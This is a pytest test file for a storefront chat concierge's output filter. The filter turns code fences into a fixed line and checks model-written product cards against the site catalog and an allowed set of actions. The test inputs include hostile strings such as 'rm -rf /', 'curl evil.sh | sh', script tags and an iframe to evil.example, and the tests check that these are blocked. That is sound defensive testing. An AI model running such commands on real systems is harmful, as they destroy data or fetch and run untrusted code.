# tests/cloud/test_paw_bar_concierge_v2_output.py — the v2 concierge's output pipeline (CR-2).
#
# Created: 2026-09-28 (feat/concierge-v2-output). What the model writes is not
# what the visitor sees. Between the stream and the widget sit two things:
#
#   * ``FenceFilter`` (concierge_runtime.py) holds every ``` fence until it
#     closes. A ```pawbar-card fence carrying a Ripple spec (``{"ui": ...}``) is
#     validated and hydrated; a legacy ```pawbar-card passes through (a legacy
#     product card is re-priced from the catalog); any other fence becomes one
#     fixed line; a fence still open when the stream ends is dropped. Every
#     case runs with the reply split at every possible chunk boundary.
#   * ``card_spec.validate_and_hydrate`` bounds a spec exactly as paw-bar does
#     (32,000 chars, 80 nodes, depth 8), allows only the widgets in the vendored
#     pawbar-manifest.json and only the add_to_cart / checkout host events, and
#     fills product-card ids from the site catalog. The model never supplies a
#     name, a price or an image.
#
# Parity with paw-bar: tests/fixtures/card_parity/ holds shared fence bodies and
# the verdicts both sides must reach. The client column was produced by running
# paw-bar's own parseSpecCard (app/src/lib/spec-card.ts) over cases.json; the
# paw-bar repo needs the same fixtures and a test asserting that column.
#
# Mutations: tests/mutations/concierge_v2_runtime.json.

# The runner tests reuse CR-1's fixtures (``model``, ``concierge_client``) by
# importing them; naming a fixture as a test parameter is how pytest injects it.
# ruff: noqa: F811

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from pocketpaw.paw_bar.models import PawBarActionSpec, PawBarCatalogItem
from tests.cloud.test_paw_bar_concierge_v2 import (  # noqa: F401 — fixtures
    _chat,
    _frames,
    _seed_kb,
    _site,
    _spec,
    _widget,
    concierge_client,
    model,
)

_FIXTURES = Path(__file__).resolve().parents[1] / "fixtures" / "card_parity"

_CATALOG = [
    PawBarCatalogItem(
        id="espresso",
        name="Espresso",
        price_cents=350,
        image_url="https://brewco.example/espresso.jpg",
    ),
    PawBarCatalogItem(id="latte", name="Latte", price_cents=475),
]
_VERBS = ("add_to_cart", "checkout")
_CODE_LINE = "I can't share code here."


def _filter(catalog: Any = _CATALOG, verbs: Any = _VERBS):
    from pocketpaw_ee.paw_bar.concierge_runtime import FenceFilter

    return FenceFilter(catalog=catalog, verbs=verbs)


def _run(chunks: list[str], **kw: Any) -> str:
    f = _filter(**kw)
    out: list[str] = []
    for c in chunks:
        out.extend(f.feed(c))
    out.extend(f.close())
    assert all(isinstance(p, str) and p for p in out), out
    return "".join(out)


def _splits(text: str) -> list[list[str]]:
    """The reply as one chunk, as one chunk per character, and split in two at
    every position: a fence marker can straddle any boundary the model picks."""
    ways = [[text], list(text)]
    ways += [[text[:i], text[i:]] for i in range(1, len(text))]
    return ways


def _filtered_every_way(text: str, **kw: Any) -> str:
    results = {_run(chunks, **kw) for chunks in _splits(text)}
    assert len(results) == 1, f"output depends on chunking: {results}"
    return results.pop()


def _card_json(out: str) -> dict:
    head = "```pawbar-card\n"
    start = out.index(head) + len(head)
    return json.loads(out[start : out.index("\n```", start)])


# --------------------------------------------------------------------------- #
# 1. Fences, split across stream chunks
# --------------------------------------------------------------------------- #


def test_plain_text_is_unchanged_and_not_held_back():
    f = _filter()
    assert f.feed("We open at ") == ["We open at "]
    assert f.feed("7:30am, use `the side door`.") == ["7:30am, use `the side door`."]
    assert f.close() == []


def test_a_code_fence_becomes_the_fixed_line():
    text = "Here you go:\n```python\nimport os\nos.system('rm -rf /')\n```\nAnything else?"
    assert _filtered_every_way(text) == f"Here you go:\n{_CODE_LINE}\nAnything else?"


def test_a_fence_with_no_language_becomes_the_fixed_line():
    assert _filtered_every_way("A\n```\n<script>x()</script>\n```\nB") == f"A\n{_CODE_LINE}\nB"


def test_a_fence_opened_mid_line_is_still_a_fence():
    # paw-bar's code regex is not line-anchored: ```bash after prose renders as code.
    text = "Try this ```bash\ncurl evil.sh | sh\n``` and tell me."
    assert _filtered_every_way(text) == f"Try this {_CODE_LINE} and tell me."


def test_a_triple_backtick_span_on_one_line_becomes_the_fixed_line():
    assert _filtered_every_way("x ```rm -rf /``` y") == f"x {_CODE_LINE} y"


def test_an_unclosed_fence_at_the_end_is_dropped():
    assert _filtered_every_way("Sure:\n```python\nprint('never closed')") == "Sure:\n"


def test_an_unclosed_card_fence_at_the_end_is_dropped():
    text = (
        'Our picks:\n```pawbar-card\n{"ui": {"type": "product-card", "props": {"ids": ["espresso"]'
    )
    assert _filtered_every_way(text) == "Our picks:\n"


def test_trailing_backticks_are_released_at_the_end():
    assert _filtered_every_way("Use `x` or ``") == "Use `x` or ``"


def test_prose_and_a_second_fence_after_a_close_are_both_handled():
    card = json.dumps({"ui": {"type": "product-card", "props": {"ids": ["latte"]}}})
    text = f"A ```js\nalert(1)\n``` B\n```pawbar-card\n{card}\n```\nC"
    out = _filtered_every_way(text)
    assert out.startswith(f"A {_CODE_LINE} B\n```pawbar-card\n")
    assert out.endswith("\n```\nC")
    assert "alert" not in out
    assert _card_json(out)["ui"]["props"]["items"][0]["name"] == "Latte"


def test_a_card_spec_is_hydrated_with_the_catalog_price_not_the_models():
    card = json.dumps(
        {
            "ui": {
                "type": "product-card",
                "props": {"ids": ["espresso"], "name": "Free Espresso", "price_cents": 1},
            },
            "theme": {"accent": "#ff0000"},
        }
    )
    out = _filtered_every_way(f"Try this:\n```pawbar-card\n{card}\n```\nEnjoy!")
    assert out.startswith("Try this:\n```pawbar-card\n") and out.endswith("\n```\nEnjoy!")
    spec = _card_json(out)
    assert spec == {
        "ui": {
            "type": "product-card",
            "props": {
                "items": [
                    {
                        "id": "espresso",
                        "name": "Espresso",
                        "price_cents": 350,
                        "currency": "USD",
                        "image_url": "https://brewco.example/espresso.jpg",
                        "actions": ["add_to_cart", "checkout"],
                    }
                ]
            },
        }
    }
    assert "Free Espresso" not in out and '"price_cents":1,' not in out


def test_an_invalid_card_spec_is_dropped_and_the_prose_kept():
    card = json.dumps({"ui": {"type": "iframe", "props": {"src": "https://evil.example"}}})
    assert _filtered_every_way(f"Look:\n```pawbar-card\n{card}\n```\nBye") == "Look:\n\nBye"


def test_a_legacy_form_card_passes_through_verbatim():
    body = (
        '{"kind": "form", "verb": "book_visit", '
        '"fields": [{"name": "name", "label": "Name", "type": "text"}]}\n'
    )
    text = f"Fill this in:\n```pawbar-card\n{body}```\nThanks"
    assert _filtered_every_way(text) == text


def test_a_legacy_card_that_is_not_json_passes_through():
    text = "Hm:\n```pawbar-card\nnot json at all\n```\nok"
    assert _filtered_every_way(text) == text


def test_a_legacy_product_card_is_repriced_from_the_catalog():
    body = json.dumps(
        {
            "kind": "product",
            "items": [
                {"id": "espresso", "name": "Espresso", "price_cents": 1, "actions": ["x"]},
                {"id": "ghost", "name": "Made Up", "price_cents": 999},
            ],
        }
    )
    out = _filtered_every_way(f"Here:\n```pawbar-card\n{body}\n```\n")
    card = _card_json(out)
    assert card["kind"] == "product"
    assert [i["id"] for i in card["items"]] == ["espresso"]
    assert card["items"][0]["price_cents"] == 350
    assert card["items"][0]["actions"] == ["add_to_cart", "checkout"]
    assert "Made Up" not in out


def test_a_legacy_product_card_with_only_unknown_ids_is_dropped():
    body = json.dumps({"items": [{"id": "ghost", "name": "Made Up", "price_cents": 999}]})
    assert _filtered_every_way(f"Here:\n```pawbar-card\n{body}\n```\nok") == "Here:\n\nok"


# --------------------------------------------------------------------------- #
# 2. validate_and_hydrate
# --------------------------------------------------------------------------- #


def _vh(spec: dict, catalog: Any = _CATALOG, verbs: Any = _VERBS) -> dict | None:
    from pocketpaw_ee.paw_bar.card_spec import validate_and_hydrate

    return validate_and_hydrate(spec, catalog, verbs=verbs)


def _pc(*ids: str) -> dict:
    return {"type": "product-card", "props": {"ids": list(ids)}}


def test_hydration_keeps_catalog_order_of_the_models_ids_and_drops_unknown_and_repeats():
    out = _vh({"ui": _pc("latte", "ghost", "espresso", "latte")})
    assert [i["id"] for i in out["ui"]["props"]["items"]] == ["latte", "espresso"]
    assert [i["price_cents"] for i in out["ui"]["props"]["items"]] == [475, 350]


def test_hydration_accepts_catalog_dicts_as_well_as_models():
    out = _vh({"ui": _pc("tea")}, catalog=[{"id": "tea", "name": "Tea", "price_cents": 200}])
    assert out["ui"]["props"]["items"][0]["name"] == "Tea"


def test_an_empty_product_card_is_dropped_from_its_parent():
    hi = {"type": "text", "props": {"text": "Hi"}}
    out = _vh({"ui": {"type": "flex", "children": [hi, _pc("ghost")]}})
    assert out == {"ui": {"type": "flex", "children": [hi]}}


def test_an_empty_product_card_at_the_root_drops_the_card():
    assert _vh({"ui": _pc("ghost")}) is None
    assert _vh({"ui": {"type": "product-card", "props": {}}}) is None
    assert _vh({"ui": {"type": "product-card", "props": {"ids": "espresso"}}}) is None


def test_card_verbs_are_the_widgets_declared_host_verbs_only():
    assert _vh({"ui": _pc("latte")}, verbs=["add_to_cart"])["ui"]["props"]["items"][0][
        "actions"
    ] == ["add_to_cart"]
    assert (
        _vh({"ui": _pc("latte")}, verbs=["book_visit"])["ui"]["props"]["items"][0]["actions"] == []
    )


def test_only_ui_and_state_survive():
    x = {"type": "text", "props": {"text": "x"}}
    out = _vh({"ui": x, "state": {"a": 1}, "theme": {"x": 1}})
    assert out == {"ui": x, "state": {"a": 1}}


def test_a_card_that_hydrates_past_the_char_bound_is_dropped():
    big = [PawBarCatalogItem(id=f"p{i}", name="N" * 900) for i in range(40)]
    spec = {"ui": _pc(*[f"p{i}" for i in range(40)])}
    assert len(json.dumps(spec)) < 32_000
    assert _vh(spec, catalog=big) is None


def test_a_catalog_name_holding_a_fence_marker_is_dropped():
    evil = [PawBarCatalogItem(id="x", name="Mug ``` rm -rf")]
    assert _vh({"ui": _pc("x")}, catalog=evil) is None


@pytest.mark.parametrize(
    "on_click",
    [
        {"action": "navigate", "target": "https://evil.example"},
        {"action": "toast", "value": "hi"},
        {"action": "emit", "target": "delete_account"},
        {"action": "emit"},
        [{"action": "set", "target": "a", "value": 1}, {"action": "emit", "target": "pin"}],
        "emit",
    ],
)
def test_disallowed_actions_reject_the_card(on_click):
    node = {"type": "button", "props": {"label": "Go"}, "on_click": on_click}
    assert _vh({"ui": node}) is None


def test_an_event_hidden_in_props_is_checked_too():
    node = {"type": "button", "props": {"label": "Go", "on_click": {"action": "navigate"}}}
    assert _vh({"ui": node}) is None


@pytest.mark.parametrize(
    "on_click",
    [
        {"action": "emit", "target": "add_to_cart", "value": {"product_id": "latte"}},
        {"action": "emit", "target": "checkout"},
        [{"action": "set", "target": "a", "value": 1}, {"action": "toggle", "target": "b"}],
    ],
)
def test_allowed_actions_pass(on_click):
    node = {"type": "button", "props": {"label": "Go"}, "on_click": on_click}
    assert _vh({"ui": node}) is not None


def test_an_unknown_widget_type_rejects_the_card():
    assert _vh({"ui": {"type": "flex", "children": [{"type": "image", "props": {}}]}}) is None


# --------------------------------------------------------------------------- #
# 3. Parity with paw-bar, and the vendored manifest
# --------------------------------------------------------------------------- #


def _load(name: str) -> Any:
    return json.loads((_FIXTURES / name).read_text(encoding="utf-8"))


def test_card_parity_fixtures_reach_the_committed_server_verdicts():
    from pocketpaw_ee.paw_bar.card_spec import card_verdict

    cases = _load("cases.json")
    expected = _load("expected.json")["verdicts"]
    catalog = _load("catalog.json")
    assert {c["name"] for c in cases} == set(expected)
    got = {
        c["name"]: card_verdict(c["body"], catalog["catalog"], verbs=catalog["verbs"])
        for c in cases
    }
    assert got == {name: v["server"] for name, v in expected.items()}


def test_card_parity_verdicts_never_let_the_server_be_looser_than_the_client():
    for name, v in _load("expected.json")["verdicts"].items():
        if v["client"] == "invalid":
            assert v["server"] == "reject", name
        if v["client"] == "legacy":
            assert v["server"] == "legacy", name
        if v["server"] == "accept":
            assert v["client"] == "spec", name


def test_card_parity_bounds_match_the_server_constants():
    from pocketpaw_ee.paw_bar import card_spec

    bounds = _load("expected.json")["bounds"]
    assert bounds == {
        "max_chars": card_spec.MAX_SPEC_CHARS,
        "max_nodes": card_spec.MAX_SPEC_NODES,
        "max_depth": card_spec.MAX_SPEC_DEPTH,
        "host_events": list(card_spec.HOST_EVENTS),
    }


# Refreshing the vendored manifest. The source is paw-bar's
# app/pawbar-manifest.json, generated there by `bun run manifest`. It was vendored
# from qbtrix/paw-bar PR #26 (branch feat/wire-spec-cards, commit f0c8c12), which
# had not merged when this was written. When paw-bar changes it:
#   1. copy the file over ee/pocketpaw_ee/paw_bar/pawbar-manifest.json unchanged;
#   2. set _MANIFEST_SHA256 below to the new hash (LF line endings);
#   3. if the widget types or actions changed, update the two sets below AND
#      re-check card_spec's server-only rules (host events, the product-card
#      hydration) and the parity fixtures in both repos.
_MANIFEST_SHA256 = "890019e19051dc756c8e1dd93a3146466fdd10f0908a310ac7292c9d950afde5"


def test_the_vendored_manifest_has_not_drifted():
    from pocketpaw_ee.paw_bar import card_spec

    raw = card_spec.MANIFEST_PATH.read_bytes().replace(b"\r\n", b"\n")
    assert hashlib.sha256(raw).hexdigest() == _MANIFEST_SHA256, (
        "pawbar-manifest.json changed; see the refresh steps above this test"
    )
    assert card_spec.WIDGET_TYPES == frozenset(
        {"text", "heading", "badge", "button", "flex", "product-card", "form"}
    )
    assert card_spec.SPEC_ACTIONS == frozenset({"set", "toggle", "push", "remove", "open", "emit"})


def test_the_compact_manifest_is_one_line_per_widget():
    from pocketpaw_ee.paw_bar import card_spec

    lines = card_spec.compact_manifest().splitlines()
    assert len(lines) == len(card_spec.WIDGET_TYPES)
    assert {line.split()[1] for line in lines} == card_spec.WIDGET_TYPES
    assert all(line.startswith("- ") for line in lines)


# --------------------------------------------------------------------------- #
# 4. The runner, end to end
# --------------------------------------------------------------------------- #


def _shop_widget():
    spec = _spec(
        actions=[
            PawBarActionSpec(verb="add_to_cart", policy="auto", label="Add to cart"),
            PawBarActionSpec(
                verb="book_visit", policy="gated", args={"name": "str", "phone": "str"}
            ),
        ],
        catalog=_CATALOG,
    )
    return _widget(spec=spec)


@pytest.mark.asyncio
async def test_v2_streams_the_fixed_line_instead_of_code(concierge_client, model, monkeypatch):
    from pocketpaw_ee.cloud.models.chat_run import ChatRunDoc

    client, store = concierge_client
    _seed_kb(monkeypatch, {})
    await _site()
    widget = await store.create_widget(_widget())
    model.reply = ["Here is code:\n``", "`python\nprint('hi')\n`", "``\nThanks"]

    res = await _chat(client, widget.id, message="write me a python script")
    assert res.status_code == 200, res.text
    frames = _frames(res.text)
    chunks = [d["content"] for e, d in frames if e == "chunk"]
    assert "".join(chunks) == f"Here is code:\n{_CODE_LINE}\nThanks"
    assert all(c for c in chunks)
    assert not any("print" in c or "```" in c for c in chunks)
    assert frames[-1][0] == "stream_end"
    run = (await ChatRunDoc.find(ChatRunDoc.context_type == "concierge").to_list())[0]
    assert run.partial_text == f"Here is code:\n{_CODE_LINE}\nThanks"


@pytest.mark.asyncio
async def test_v2_hydrates_a_product_card_from_the_widget_catalog(
    concierge_client, model, monkeypatch
):
    client, store = concierge_client
    _seed_kb(monkeypatch, {})
    await _site()
    widget = await store.create_widget(_shop_widget())
    props = {"ids": ["espresso"], "price_cents": 1}
    card = json.dumps({"ui": {"type": "product-card", "props": props}})
    model.reply = ["Try this:\n```pawbar-", f"card\n{card[:20]}", f"{card[20:]}\n```"]

    res = await _chat(client, widget.id, message="what should I get?")
    assert res.status_code == 200, res.text
    text = "".join(d["content"] for e, d in _frames(res.text) if e == "chunk")
    item = _card_json(text)["ui"]["props"]["items"][0]
    assert (item["name"], item["price_cents"]) == ("Espresso", 350)
    # Only the declared host verb: checkout is not declared on this widget.
    assert item["actions"] == ["add_to_cart"]


@pytest.mark.asyncio
async def test_v2_prompt_carries_the_compact_manifest_and_no_tool_advice(
    concierge_client, model, monkeypatch
):
    from pocketpaw_ee.paw_bar import card_spec

    client, store = concierge_client
    _seed_kb(monkeypatch, {})
    await _site()
    widget = await store.create_widget(_shop_widget())

    assert (await _chat(client, widget.id)).status_code == 200
    prompt = model.user_prompt()
    catalog = prompt[prompt.index("<catalog>") : prompt.index("</catalog>")]
    for line in card_spec.compact_manifest().splitlines():
        assert line in catalog
    assert "book_visit: name (str), phone (str)" in catalog
    # CR-1 reused the legacy form block, which told the model to call a tool.
    assert "action tool" not in prompt
    assert '"kind": "form"' not in prompt


def test_a_card_block_needs_no_widget_catalog():
    """The FenceFilter the runner builds reads the widget's spec; a widget with
    no spec still filters code and drops every product card."""
    from pocketpaw_ee.paw_bar.concierge_runtime import _fence_filter_for

    f = _fence_filter_for(SimpleNamespace(spec=None))
    card = json.dumps({"ui": _pc("espresso")})
    out = "".join(f.feed(f"a\n```pawbar-card\n{card}\n```\nb```sh\nls\n```")) + "".join(f.close())
    assert out == f"a\n\nb{_CODE_LINE}"
